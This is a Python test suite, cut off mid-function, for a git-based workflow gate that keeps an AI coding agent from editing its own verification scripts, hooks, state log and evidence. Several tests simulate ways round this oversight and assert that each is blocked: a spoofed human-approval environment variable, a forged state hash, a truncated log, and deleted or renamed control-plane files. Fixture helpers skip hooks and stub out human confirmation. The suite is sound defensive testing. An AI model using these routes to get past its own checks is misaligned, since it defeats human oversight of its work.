import importlib, json, os, re, shutil, subprocess, sys, tempfile, unittest
from dataclasses import replace as dataclasses_replace
from pathlib import Path

SRC=Path(__file__).resolve().parents[2]

def shipped_roots(src):
    manifest=src/"workflow/SHIPPED-MANIFEST.txt"
    return [line.strip().rstrip('/') for line in manifest.read_text(encoding="utf-8").splitlines() if line.strip() and not line.lstrip().startswith('#')]

OWNED=shipped_roots(SRC)


def stamp_approved_profile(r):
    """讓 fixture 進入「profile 已解析且已被人類批准」的狀態，回傳該 digest。

    手工造 evidence 的測試必須用它。core evidence 現在要自證來歷
    （`Approved profile digest` 必須等於 STATE 的值），所以一份宣稱「合法」的
    fixture 也必須在**來歷**這一維度上合法 —— 否則測試會退化成
    「缺欄位的 evidence 被拒」，測不到它原本要測的那件事。
    """
    import re as _re, sys as _sys
    pp=r/'PROJECT-PROFILE.md'; txt=pp.read_text(encoding='utf-8')
    # **只補尚未決定的欄位。** 呼叫端可能刻意設了 Type / Web verification required
    # 來測某個分支；覆蓋掉它們會讓那些測試安靜地測到別的東西。
    for k,v,undecided in (('Type','CLI',('UNKNOWN',)),
                          ('Web verification required','no',('auto',)),
                          ('Primary stack','Python 3.12',('UNKNOWN',)),
                          ('Package manager','uv',('UNKNOWN',)),
                          ('Monorepo','no',('UNKNOWN',)),
                          ('CI provider','GitHub Actions',('UNKNOWN',)),
                          ('Test database strategy','not-applicable',('UNKNOWN',))):
        m=_re.search(rf'^{_re.escape(k)}:[ \t]*(.*?)[ \t]*$',txt,flags=_re.M)
        if m and m.group(1) not in undecided: continue
        txt=_re.sub(rf'^{_re.escape(k)}:[ \t]*.*$',f'{k}: {v}',txt,count=1,flags=_re.M)
    pp.write_text(txt,encoding='utf-8')
    _sys.path.insert(0,str(r/'workflow/bin'))
    try:
        import workflow_state as _W
        importlib.reload(_W)
        # WEB 專案必須定義 critical journeys（決定 Browser Verification 範圍，
        # 並納入被批准的 digest）。fixture 若把 Type 設成 WEB_APP 卻不定義 journeys，
        # profile 就解析不完全。
        if _W.project_web_status(r)=='WEB' and not _W.critical_journeys(r):
            txt=pp.read_text(encoding='utf-8')
            pp.write_text(txt.replace('## Critical user journeys\n- 尚未定義',
                                      '## Critical user journeys\n- [J1] 主要流程可完成'),
                          encoding='utf-8')
        unres,inv,_,dg=_W.profile_resolution(r)
        assert not inv and dg, f'fixture 的 profile 必須完全解析：未解析={unres} 非法={inv}'
        st=r/'workflow/STATE.md'; s=st.read_text(encoding='utf-8')
        # spec / test design 的 digest 也要一起蓋。fixture 若只蓋 profile，
        # 模擬出來的是一個真實流程不會產生的狀態：`Spec approved: yes` 卻沒有
        # 對應的被批准內容 digest。
        chg=_re.search(r'^Active OpenSpec change:[ \t]*(.*?)[ \t]*$',s,_re.M)
        chg=chg.group(1) if chg else 'none'
        # 宣稱批准了什麼，那個東西就得存在。fixture 說 `Test design approved: yes`
        # 卻沒有 artifact 的話，模擬的是一個真實流程產生不出來的狀態。
        if chg not in ('none',''):
            d=r/'openspec/changes'/chg
            if not d.is_dir():
                d.mkdir(parents=True,exist_ok=True)
                (d/'proposal.md').write_text('# Proposal\n',encoding='utf-8')
            tc=r/'workflow/test-cases'/f'{chg}.md'
            if not tc.is_file():
                tc.parent.mkdir(parents=True,exist_ok=True)
                tc.write_text('# Test Design\n- [ ] 案例\n',encoding='utf-8')
        sdg=_W.spec_digest(r,chg) or 'none'
        tdg=_W.test_design_digest(r,chg) or 'none'
        for key,val in (('Approved profile digest',dg),('Approved spec digest',sdg),
                        ('Approved test design digest',tdg)):
            if f'{key}:' in s:
                s=_re.sub(rf'^{_re.escape(key)}:.*$',f'{key}: {val}',s,flags=_re.M)
            else:
                s=s.replace('Last updated:',f'{key}: {val}\nLast updated:',1)
        st.write_text(s,encoding='utf-8')
        # 被批准的內容必須已經在 HEAD，且三個來源一致。少了這一步，fixture 模擬的
        # 是「STATE 宣稱已批准、但 fresh clone 拿不到被批准的東西」—— 真實的
        # approve-spec 現在產生不出這種狀態。
        commit_approved_artifacts(r, chg)
    finally:
        _sys.path.remove(str(r/'workflow/bin'))
    return dg
def fixture():
    td=Path(tempfile.mkdtemp(prefix="starter-reg-")); r=td/"repo"; r.mkdir()
    for rel in OWNED:
        s=SRC/rel
        if not s.exists(): continue
        d=r/rel
        if s.is_dir(): shutil.copytree(s,d,ignore=shutil.ignore_patterns("tests","__pycache__","*.pyc","node_modules","dist","build",".next","venv",".venv","coverage","playwright-report","test-results"))
        else: d.parent.mkdir(parents=True,exist_ok=True); shutil.copy2(s,d)
    return td,r


def ensure_git_repo(r):
    """讓 fixture 成為真的 git repository（不建立 commit）。

    被批准的內容要綁到 worktree/index/HEAD 三者，而 Starter 本來就要求 git
    （bootstrap 會安裝 hook）。一個沒有 git 的 fixture 模擬的是真實安裝不會存在的
    狀態 —— 它讓所有依賴 Git 歷史的判準退化成「取不到就跳過」，那是最糟的綠燈。

    刻意不 commit：有些測試（例如 bootstrap 的 fail-closed）需要一個還沒有
    baseline commit 的起點。"""
    if not (r/'.git').exists():
        subprocess.run(['git','-C',str(r),'init','-b','main'],capture_output=True)
    for args in (['config','user.email','reg@example.invalid'],
                 ['config','user.name','Reg'],['config','commit.gpgsign','false']):
        subprocess.run(['git','-C',str(r)]+args,capture_output=True)


def recommit(r, msg='fixture: bind content to HEAD'):
    """把目前 worktree 送進 index 與 HEAD，讓三個來源一致。

    「批准後內容被換掉」有兩種形狀，各自由不同的一層擋下：

    - **只改 worktree**（不 stage）→ 三來源分裂，由 content_sources_agree 擋。
    - **改完並 commit** → 三來源一致但與批准的 digest 不符，由 digest 比對擋。

    兩層都必須有測試鎖住。只測前者的話，digest 那層可以被整個刪掉而測試全綠 ——
    這正是 N3 與 Q7c 兩次踩到的坑（冗餘層的訊息沒被鎖住）。
    """
    subprocess.run(['git','-C',str(r),'add','-A'],capture_output=True)
    subprocess.run(['git','-C',str(r),'-c','core.hooksPath=/dev/null','commit',
                    '--no-verify','-m',msg],capture_output=True)


def recommit_paths(r, *paths, msg='fixture: bind paths to HEAD'):
    """只把指定路徑送進 HEAD。用在「掉包被批准內容、但產品程式碼要留在 staged」
    的情境 —— `git add -A` 會把待驗的產品變更一起 commit 掉，gate 就沒東西可看了。"""
    subprocess.run(['git','-C',str(r),'add','--',*paths],capture_output=True)
    # `git commit` 不加 pathspec 會提交整個 index —— 連帶把待驗的產品變更也 commit 掉，
    # gate 就沒有 staged 產品檔案可看，測試會假綠。
    subprocess.run(['git','-C',str(r),'-c','core.hooksPath=/dev/null','commit',
                    '--no-verify','-m',msg,'--',*paths],capture_output=True)


def commit_approved_artifacts(r, chg, extra=()):
    """把被批准的內容送進 HEAD，讓 worktree/index/HEAD 三者一致。"""
    ensure_git_repo(r)
    paths=['PROJECT-PROFILE.md',*extra]
    if chg not in ('none','',None):
        paths += [f'openspec/changes/{chg}', f'workflow/test-cases/{chg}.md']
    have=[x for x in paths if (r/x).exists()]
    if have:
        subprocess.run(['git','-C',str(r),'add','--']+have,capture_output=True)
    subprocess.run(['git','-C',str(r),'commit','--no-verify','-m','fixture: approved content'],
                   capture_output=True)

class HookDecisionTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture()
    def tearDown(self): shutil.rmtree(self.td,ignore_errors=True)
    def set_state(self,phase="ENGINEERING",typ="API",web="no"):
        p=self.r/"workflow/STATE.md"
        import re
        t=p.read_text()
        t=re.sub(r"^Phase:.*$",f"Phase: {phase}",t,flags=re.M)
        t=re.sub(r"^Active OpenSpec change:.*$","Active OpenSpec change: demo",t,flags=re.M)
        t=re.sub(r"^Spec approved:.*$","Spec approved: yes",t,flags=re.M)
        t=re.sub(r"^Test design approved:.*$","Test design approved: yes",t,flags=re.M)
        p.write_text(t)
        pr=self.r/"PROJECT-PROFILE.md"
        q=pr.read_text()
        q=re.sub(r"^Type:.*$",f"Type: {typ}",q,flags=re.M)
        q=re.sub(r"^Web verification required:.*$",f"Web verification required: {web}",q,flags=re.M)
        pr.write_text(q)
        # ENGINEERING 現在還包含「profile 與人類批准的內容一致」。fixture 只設
        # phase 與兩個 approval flag 的話，模擬出來的是一個真實流程不會產生的狀態。
        stamp_approved_profile(self.r)
    def hook(self,rel):
        payload=json.dumps({"tool_name":"Write","tool_input":{"file_path":str(self.r/rel)}})
        x=subprocess.run(["python3",".claude/hooks/guard-workflow-gate.py"],cwd=self.r,input=payload,capture_output=True,text=True)
        return "deny" in x.stdout.lower()
    def test_decision_matrix(self):
        self.set_state()
        for rel in ["workflow/bin/verify.sh","workflow/tests/test_e2e.py",".githooks/pre-commit","workflow/state-log.md","workflow/evidence/demo/core/20260101T000000Z.md"]:
            self.assertTrue(self.hook(rel),rel)
        self.assertTrue(self.hook("workflow/evidence/demo/browser.md")) # NON_WEB
        self.assertFalse(self.hook("workflow/test-cases/demo.md"))
        self.assertFalse(self.hook("scripts/deploy.sh"))
        self.assertTrue(self.hook("PROJECT-PROFILE.md"))
        self.set_state(phase="DISCOVERY")
        self.assertFalse(self.hook("PROJECT-PROFILE.md"))

        self.set_state(typ="WEB_APP",web="yes")
        self.assertFalse(self.hook("workflow/evidence/demo/browser.md"))

class GateNegativeTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture()
        subprocess.run(["git","init"],cwd=self.r,capture_output=True)
        subprocess.run(["git","config","user.email","r@example.invalid"],cwd=self.r)
        subprocess.run(["git","config","user.name","R"],cwd=self.r)
        # ensure hook executable before baseline
        (self.r/".githooks/pre-commit").chmod(0o755)
        subprocess.run(["git","add","."],cwd=self.r)
        subprocess.run(["git","commit","-m","baseline"],cwd=self.r,capture_output=True)
    def tearDown(self): shutil.rmtree(self.td,ignore_errors=True)
    def test_fake_env_cannot_authorize_control_plane(self):
        p=self.r/"workflow/bin/verify.sh"; p.write_text(p.read_text()+"\n# tamper\n")
        subprocess.run(["git","add","workflow/bin/verify.sh"],cwd=self.r)
        env=dict(**__import__("os").environ); env["STARTER_CONTROL_PLANE_AUTH"]="tty-approved:anyone"
        x=subprocess.run(["python3","workflow/bin/check-implementation-gate.py","--staged"],cwd=self.r,env=env,capture_output=True,text=True)
        self.assertNotEqual(x.returncode,0)
        self.assertIn("Control Plane",x.stderr)
    def test_non_pristine_host_product_commit_not_blocked_by_selftests(self):
        # set engineering with legitimate log hash by direct fixture manipulation, product file then gate only
        import sys, hashlib
        sys.path.insert(0,str(self.r/"workflow/bin"))
        from workflow_state import parse_state,write_state,state_hash_path
        from dataclasses import replace
        st=self.r/"workflow/STATE.md"; s=parse_state(st)
        ns=replace(s,phase="ENGINEERING",active_change="demo",spec_approved="yes",test_design_approved="yes")
        write_state(st,ns)
        h=state_hash_path(st)
        with (self.r/"workflow/state-log.md").open("a") as f: f.write(f"## fixture\n- State hash: {h}\n")
        subprocess.run(["git","add","workflow/STATE.md","workflow/state-log.md"],cwd=self.r)
        # use no-verify only in test fixture baseline transition to focus product commit regression
        subprocess.run(["git","commit","--no-verify","-m","state fixture"],cwd=self.r,capture_output=True)
        (self.r/"src").mkdir(); (self.r/"src/x.txt").write_text("x")
        subprocess.run(["git","add","src/x.txt"],cwd=self.r)
        x=subprocess.run(["bash","workflow/bin/verify.sh","--pre-commit"],cwd=self.r,capture_output=True,text=True)
        self.assertEqual(x.returncode,0,x.stdout+x.stderr)



class MoreNegativeTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture();subprocess.run(["git","init"],cwd=self.r,capture_output=True);subprocess.run(["git","config","user.email","n@example.invalid"],cwd=self.r);subprocess.run(["git","config","user.name","N"],cwd=self.r);(self.r/".githooks/pre-commit").chmod(0o755);subprocess.run(["git","add","."],cwd=self.r);subprocess.run(["git","commit","-m","baseline"],cwd=self.r,capture_output=True)
    def tearDown(self): shutil.rmtree(self.td,ignore_errors=True)
    def test_fake_state_hash_blocked(self):
        p=self.r/"workflow/STATE.md";p.write_text(p.read_text().replace("Last updated: none","Last updated: fake"));(self.r/"workflow/state-log.md").write_text("# Workflow State Log\n\n## fake\n- State hash: "+"0"*64+"\n");subprocess.run(["git","add","workflow/STATE.md","workflow/state-log.md"],cwd=self.r);x=subprocess.run(["python3","workflow/bin/check-implementation-gate.py","--staged"],cwd=self.r,capture_output=True,text=True);self.assertNotEqual(x.returncode,0)
    def test_state_log_truncate_blocked(self):
        log=self.r/"workflow/state-log.md";log.write_text("# Workflow State Log\n\n## old\n- State hash: "+"0"*64+"\n");subprocess.run(["git","add","workflow/state-log.md"],cwd=self.r);subprocess.run(["git","commit","--no-verify","-m","fixture"],cwd=self.r,capture_output=True);log.write_text("# Workflow State Log\n\n");subprocess.run(["git","add","workflow/state-log.md"],cwd=self.r);x=subprocess.run(["python3","workflow/bin/check-implementation-gate.py","--staged"],cwd=self.r,capture_output=True,text=True);self.assertNotEqual(x.returncode,0)
    def _web(self):
        st=self.r/"workflow/STATE.md";st.write_text(st.read_text().replace("Phase: DISCOVERY","Phase: ENGINEERING").replace("Active OpenSpec change: none","Active OpenSpec change: demo").replace("Spec approved: no","Spec approved: yes").replace("Test design approved: no","Test design approved: yes"));pr=self.r/"PROJECT-PROFILE.md";pr.write_text(pr.read_text().replace("Type: UNKNOWN","Type: WEB_APP").replace("Web verification required: auto","Web verification required: yes"));d=self.r/"workflow/evidence/demo/core";d.mkdir(parents=True,exist_ok=True);(d/"20260101T000000Z.md").write_text("Overall exit code: 0\n")
    def _validate(self):
        code=f"import sys;sys.path.insert(0,{str(self.r/'workflow/bin')!r});import workflow_transition as w;w.ROOT=__import__('pathlib').Path({str(self.r)!r});w.validate_browser('demo')";return subprocess.run(["python3","-c",code],cwd=self.r,capture_output=True,text=True)
    def test_web_not_applicable_blocked(self):
        self._web();b=self.r/"workflow/evidence/demo/browser.md";b.parent.mkdir(parents=True,exist_ok=True);b.write_text("Browser Gate: NOT APPLICABLE\n");self.assertNotEqual(self._validate().returncode,0)
    def test_browser_missing_core_blocked(self):
        self._web();r=self.r/"playwright-report";r.mkdir();(r/"index.html").write_text("x");(self.r/"workflow/evidence/demo/browser.md").write_text("Core evidence: 20990101T000000Z.md\nPlaywright report: playwright-report/index.html\nChrome DevTools MCP: ok\n");self.assertNotEqual(self._validate().returncode,0)
    def test_browser_missing_report_blocked(self):
        self._web();(self.r/"workflow/evidence/demo/browser.md").write_text("Core evidence: 20260101T000000Z.md\nPlaywright report: playwright-report/index.html\nChrome DevTools MCP: ok\n");self.assertNotEqual(self._validate().returncode,0)


class GitMutationTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture();subprocess.run(["git","init"],cwd=self.r,capture_output=True);subprocess.run(["git","config","user.email","m@example.invalid"],cwd=self.r);subprocess.run(["git","config","user.name","M"],cwd=self.r);(self.r/".githooks/pre-commit").chmod(0o755);subprocess.run(["git","add","-A"],cwd=self.r);subprocess.run(["git","commit","-m","baseline"],cwd=self.r,capture_output=True)
    def tearDown(self): shutil.rmtree(self.td,ignore_errors=True)
    def gate(self): return subprocess.run(["python3","workflow/bin/check-implementation-gate.py","--staged"],cwd=self.r,capture_output=True,text=True)
    def test_delete_control_plane_blocked(self):
        (self.r/".claude/hooks/guard-workflow-gate.py").unlink();subprocess.run(["git","add","-A"],cwd=self.r);self.assertNotEqual(self.gate().returncode,0)
    def test_delete_state_log_file_blocked(self):
        (self.r/"workflow/state-log.md").unlink();subprocess.run(["git","add","-A"],cwd=self.r);self.assertNotEqual(self.gate().returncode,0)
    def test_rename_control_plane_away_blocked(self):
        (self.r/"docs").mkdir(exist_ok=True);subprocess.run(["git","mv",".claude/hooks/guard-workflow-gate.py","docs/x.py"],cwd=self.r);self.assertNotEqual(self.gate().returncode,0)

class AuditControlPlaneTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture()
        self.git('init','-b','main')
        self.git('config','user.email','a@example.invalid')
        self.git('config','user.name','A')
        (self.r/'.githooks/pre-commit').chmod(0o755)
        self.git('add','-A')
        self.git('commit','-m','baseline')
    def tearDown(self): shutil.rmtree(self.td,ignore_errors=True)
    def git(self,*a,check=True):
        r=subprocess.run(['git',*a],cwd=self.r,capture_output=True,text=True)
        if check:self.assertEqual(r.returncode,0,f"git {' '.join(a)} failed:\n{r.stdout}\n{r.stderr}")
        return r
    def sha(self,ref='HEAD'): return self.git('rev-parse',ref).stdout.strip()
    def audit(self,base,head='HEAD'):
        self.assertTrue(self.git('rev-list',f'{base}..{head}').stdout.strip(),f'audit range unexpectedly empty: {base}..{head}')
        return subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,head],cwd=self.r,capture_output=True,text=True)
    def authorized_commit(self,*paths):
        import sys
        sys.path.insert(0,str(self.r/'workflow/bin'));import workflow_state as ws
        changes=ws.staged_changes(self.r);cp=[c for c in changes if ws.change_touches_control_plane(c,'DISCOVERY') and not all(p in {'workflow/STATE.md','workflow/state-log.md'} for p in c.paths)];digest=ws.control_plane_digest(self.r,cp,'staged');sys.path.pop(0);sys.modules.pop('workflow_state',None)
        with (self.r/'workflow/state-log.md').open('a') as f:f.write(f'## audit-test\n- Actor: test\n- Action: control-plane-commit\n- Control Plane digest: {digest}\n- Reason: test\n\n')
        self.git('add','workflow/state-log.md')
        return self.git('commit','--no-verify','-m','cp')
    def test_unauthorized_cp_commit_fails_audit(self):
        base=self.sha();p=self.r/'workflow/bin/verify.sh';p.write_text(p.read_text()+'\n# x\n');self.git('add',str(p.relative_to(self.r)));self.git('commit','--no-verify','-m','bad');self.assertNotEqual(self.audit(base).returncode,0)
    def test_authorized_rebase_stays_valid(self):
        self.git('branch','side-base');p=self.r/'workflow/bin/check-workflow.sh';p.write_text(p.read_text()+'\n# cp\n');self.git('add',str(p.relative_to(self.r)));self.authorized_commit(p);before=self.sha()
        self.git('checkout','-q','side-base');(self.r/'x').write_text('x');self.git('add','x');self.git('commit','-m','x');onto=self.sha()
        self.git('checkout','-q','main');self.git('rebase',onto)
        after=self.sha();self.assertNotEqual(before,after,'rebase did not rewrite authorized commit')
        self.assertEqual(self.audit(onto).returncode,0)
    def test_crlf_authorized_audit_ok(self):
        base=self.sha();p=self.r/'workflow/bin/check-workflow.sh';p.write_bytes(p.read_bytes().replace(b'\n',b'\r\n'));self.git('add',str(p.relative_to(self.r)));self.authorized_commit(p);self.assertEqual(self.audit(base).returncode,0)
    def test_merge_commit_cp_mutation_fails(self):
        base=self.sha();self.git('checkout','-qb','side');(self.r/'side').write_text('s');self.git('add','side');self.git('commit','-m','side')
        self.git('checkout','-q','main');(self.r/'main').write_text('m');self.git('add','main');self.git('commit','-m','main');self.git('merge','--no-commit','side')
        p=self.r/'workflow/bin/verify.sh';p.write_text(p.read_text()+'\n# merge cp\n');self.git('add',str(p.relative_to(self.r)));self.git('commit','--no-verify','-m','merge')
        parents=self.git('rev-list','--parents','-n','1','HEAD').stdout.split();self.assertGreaterEqual(len(parents),3,'expected real merge commit')
        self.assertNotEqual(self.audit(base).returncode,0)
    def test_merge_of_two_authorized_cp_commits_is_ok(self):
        base=self.sha();self.git('checkout','-qb','feat')
        p1=self.r/'workflow/bin/check-workflow.sh';p1.write_text(p1.read_text()+'\n# one\n');self.git('add',str(p1.relative_to(self.r)));self.authorized_commit(p1)
        p2=self.r/'workflow/bin/setup-git-hooks.sh';p2.write_text(p2.read_text()+'\n# two\n');self.git('add',str(p2.relative_to(self.r)));self.authorized_commit(p2)
        self.git('checkout','-q','main')
        # 分岔用的檔案要放在 AI-writable 路徑。放在 repo 根目錄等於在 DISCOVERY 階段
        # commit 產品程式碼 —— 那本來就該被工作流授權稽核擋下，會讓這條測試測到別的東西。
        (self.r/'docs').mkdir(exist_ok=True);(self.r/'docs/main-only.md').write_text('m')
        self.git('add','docs/main-only.md');self.git('commit','-m','main diverge')
        self.git('merge','--no-ff','feat','-m','merge feat')
        self.assertGreaterEqual(len(self.git('rev-list','--parents','-n','1','HEAD').stdout.split()),3)
        self.assertEqual(self.audit(base).returncode,0)

class UnicodeAndInstallTests(unittest.TestCase):
    def setUp(self):
        self.td,self.r=fixture();self.git('init','-b','main');self.git('config','user.email','u@example.invalid');self.git('config','user.name','U');(self.r/'.githooks/pre-commit').chmod(0o755);self.git('add','-A');self.git('commit','-m','baseline')
    def tearDown(self):shutil.rmtree(self.td,ignore_errors=True)
    def git(self,*a,check=True):
        r=subprocess.run(['git',*a],cwd=self.r,capture_output=True,text=True)
        if check:self.assertEqual(r.returncode,0,f"git {' '.join(a)} failed:\n{r.stdout}\n{r.stderr}")
        return r
    def gate(self):return subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],cwd=self.r,capture_output=True,text=True)
    def test_unicode_openspec_and_adr_allowed(self):
        d=self.r/'openspec/changes/新增登入流程';d.mkdir(parents=True)
        for n in ('proposal.md','spec.md','tasks.md'):(d/n).write_text('# x')
        adr=self.r/'docs/adr/0002-中文決策記錄.md';adr.parent.mkdir(parents=True,exist_ok=True);adr.write_text('# ADR')
        self.git('add','-A');x=self.gate();self.assertEqual(x.returncode,0,x.stderr)
    def test_unicode_control_plane_rename_still_blocked(self):
        src=self.r/'workflow/tests/中文測試.py';src.parent.mkdir(parents=True,exist_ok=True);src.write_text('x');self.git('add',str(src.relative_to(self.r)));self.git('commit','--no-verify','-m','fixture unicode cp')
        dst=self.r/'docs/中文測試.py';dst.parent.mkdir(parents=True,exist_ok=True);self.git('mv',str(src.relative_to(self.r)),str(dst.relative_to(self.r)));self.assertNotEqual(self.gate().returncode,0)



class InstallationAuditTests(unittest.TestCase):
    def make_repo(self,brownfield=True,tamper=False):
        td=Path(tempfile.mkdtemp(prefix='starter-install-'));r=td/'repo';r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','i@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','I'],cwd=r,check=True)
        if brownfield:
            (r/'product.txt').write_text('product');subprocess.run(['git','add','.'],cwd=r,check=True);subprocess.run(['git','commit','-m','product'],cwd=r,check=True,capture_output=True)
        for rel in OWNED:
            src=SRC/rel
            if not src.exists():continue
            dst=r/rel
            if src.is_dir():shutil.copytree(src,dst,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:dst.parent.mkdir(parents=True,exist_ok=True);shutil.copy2(src,dst)
        if tamper:
            p=r/'workflow/STATE.md';p.write_text(p.read_text().replace('Phase: DISCOVERY','Phase: ENGINEERING'))
        return td,r
    def audit(self,r,base):return subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,'HEAD'],cwd=r,capture_output=True,text=True)
    def test_brownfield_install_baseline_audit_ok(self):
        td,r=self.make_repo(True)
        try:
            subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,check=True,capture_output=True,text=True)
            base=subprocess.check_output(['git','rev-parse','HEAD~1'],cwd=r,text=True).strip();self.assertEqual(self.audit(r,base).returncode,0)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_greenfield_install_baseline_audit_ok(self):
        td,r=self.make_repo(False)
        try:
            subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,check=True,capture_output=True,text=True)
            empty=subprocess.check_output(['git','hash-object','-t','tree','/dev/null'],cwd=r,text=True).strip();self.assertEqual(self.audit(r,empty).returncode,0)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_tampered_install_baseline_audit_fails(self):
        td,r=self.make_repo(True,True)
        try:
            subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,check=True,capture_output=True,text=True)
            base=subprocess.check_output(['git','rev-parse','HEAD~1'],cwd=r,text=True).strip();self.assertNotEqual(self.audit(r,base).returncode,0)
        finally:shutil.rmtree(td,ignore_errors=True)

class R10PolicyInvariantTests(unittest.TestCase):
    def test_shipped_state_is_pristine(self):
        import sys
        sys.path.insert(0,str(SRC/'workflow/bin'))
        from workflow_state import state_hash_path, initial_state_hash
        self.assertEqual(state_hash_path(SRC/'workflow/STATE.md'), initial_state_hash())

    def test_surrogate_path_digest_does_not_raise(self):
        import sys
        sys.path.insert(0,str(SRC/'workflow/bin'))
        from workflow_state import GitChange, control_plane_digest
        weird=b'workflow/bin/\xff.sh'.decode('utf-8','surrogateescape')
        digest=control_plane_digest(SRC,[GitChange('D',weird,None)],'staged')
        self.assertRegex(digest,r'^[0-9a-f]{64}$')

class R11AdoptPreflightTests(unittest.TestCase):
    def copy_starter(self,r):
        for rel in OWNED:
            src=SRC/rel
            if not src.exists(): continue
            dst=r/rel
            if src.is_dir():
                shutil.copytree(src,dst,dirs_exist_ok=True,ignore=shutil.ignore_patterns('__pycache__','*.pyc','node_modules','dist','build','.next','venv','.venv','coverage','playwright-report','test-results'))
            else:
                dst.parent.mkdir(parents=True,exist_ok=True);shutil.copy2(src,dst)
        (r/'.githooks/pre-commit').chmod(0o755)
    def repo(self,conflict=None):
        td=Path(tempfile.mkdtemp(prefix='r11-adopt-'));r=td/'repo';r.mkdir()
        subprocess.run(['git','init','-b','main'],cwd=r,check=True,capture_output=True)
        subprocess.run(['git','config','user.email','r11@example.invalid'],cwd=r,check=True)
        subprocess.run(['git','config','user.name','R11'],cwd=r,check=True)
        (r/'src').mkdir();(r/'src/app.js').write_text('base\n')
        if conflict:
            p=r/conflict;p.parent.mkdir(parents=True,exist_ok=True);p.write_text('existing\n')
            if conflict=='.githooks/pre-commit':p.chmod(0o755)
        subprocess.run(['git','add','-A'],cwd=r,check=True);subprocess.run(['git','commit','-m','product baseline'],cwd=r,check=True,capture_output=True)
        base=subprocess.check_output(['git','rev-parse','HEAD'],cwd=r,text=True).strip()
        self.copy_starter(r)
        return td,r,base
    def cmd(self,r,*args):
        return subprocess.run(['python3','workflow/bin/workflow_transition.py',*args],cwd=r,capture_output=True,text=True)
    def test_conflict_preflight_blocks_without_commit(self):
        td,r,base=self.repo('.claude/settings.json')
        try:
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,2,x.stdout+x.stderr);self.assertIn('M: .claude/settings.json',x.stderr);self.assertEqual(subprocess.check_output(['git','rev-parse','HEAD'],cwd=r,text=True).strip(),base)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_clean_brownfield_bootstrap_completes(self):
        td,r,base=self.repo()
        try:
            x=subprocess.run(['bash','workflow/bin/bootstrap.sh'],cwd=r,capture_output=True,text=True)
            self.assertEqual(x.returncode,0,x.stdout+x.stderr);self.assertNotEqual(subprocess.check_output(['git','rev-parse','HEAD'],cwd=r,text=True).strip(),base)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_adopt_rejects_when_head_already_has_state(self):
        td,r,base=self.repo()
        try:
            subprocess.run(['git','add','-A'],cwd=r,check=True);subprocess.run(['git','commit','--no-verify','-m','starter'],cwd=r,check=True,capture_output=True)
            self.assertEqual(self.cmd(r,'adopt-control-plane','--dry-run').returncode,75)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_adopt_rejects_without_conflict(self):
        td,r,base=self.repo()
        try:
            subprocess.run(['git','add','-A'],cwd=r,check=True)
            self.assertEqual(self.cmd(r,'adopt-control-plane','--dry-run').returncode,76)
        finally:shutil.rmtree(td,ignore_errors=True)
    def _adopt_without_tty_for_test(self,r):
        import importlib.util,sys,argparse,io,contextlib
        sys.path.insert(0,str(r/'workflow/bin'))
        spec=importlib.util.spec_from_file_location('wt_r11',r/'workflow/bin/workflow_transition.py');m=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)
        m.tty_human_confirm=lambda action,change:'test-human'
        buf=io.StringIO()
        with contextlib.redirect_stdout(buf):
            m.cmd_adopt_control_plane(argparse.Namespace(dry_run=False))
        self.assertIn('Brownfield adoption staged mutations:',buf.getvalue())
        sys.path.pop(0);sys.modules.pop('workflow_state',None)
    def test_adopt_then_discovery_profile_audit_ok(self):
        td,r,base=self.repo('.claude/settings.json')
        try:
            subprocess.run(['git','add','-A'],cwd=r,check=True);self._adopt_without_tty_for_test(r)
            a=subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,'HEAD'],cwd=r,capture_output=True,text=True);self.assertEqual(a.returncode,0,a.stdout+a.stderr)
            subprocess.run(['bash','workflow/bin/setup-git-hooks.sh'],cwd=r,check=True,capture_output=True)
            p=r/'PROJECT-PROFILE.md';p.write_text(p.read_text().replace('Type: UNKNOWN','Type: WEB_APP'))
            subprocess.run(['git','add','PROJECT-PROFILE.md'],cwd=r,check=True)
            g=subprocess.run(['python3','workflow/bin/check-implementation-gate.py','--staged'],cwd=r,capture_output=True,text=True);self.assertEqual(g.returncode,0,g.stderr)
            subprocess.run(['git','commit','-m','docs: profile'],cwd=r,check=True,capture_output=True)
            a2=subprocess.run(['python3','workflow/bin/audit-control-plane.py',base,'HEAD'],cwd=r,capture_output=True,text=True);self.assertEqual(a2.returncode,0,a2.stdout+a2.stderr)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_adopt_rejects_product_staged_and_lists_it(self):
        td,r,base=self.repo('.claude/settings.json')
        try:
            (r/'src/app.js').write_text('base\nproduct-change\n');(r/'src/secret.js').write_text('secret\n');subprocess.run(['git','add','-A'],cwd=r,check=True)
            x=self.cmd(r,'adopt-control-plane','--dry-run');self.assertEqual(x.returncode,79,x.stdout+x.stderr);self.assertIn('M: src/app.js',x.stdout+x.stderr);self.assertIn('A: src/secret.js',x.stdout+x.stderr)
        finally:shutil.rmtree(td,ignore_errors=True)
    def test_engineering_profile_is_still_blocked(self):
        td,r,base=self.repo('.claude/settings.json')
        try:
            subprocess.run(['git','add','-A'],cwd=r,check=True);self._adopt_without_tty_for_test(r)
            import sys
            sys.path.insert(0,str(r/'workflow/bin'));from workflow_state import parse_state,write_state,state_hash_path;from dataclasses import replace
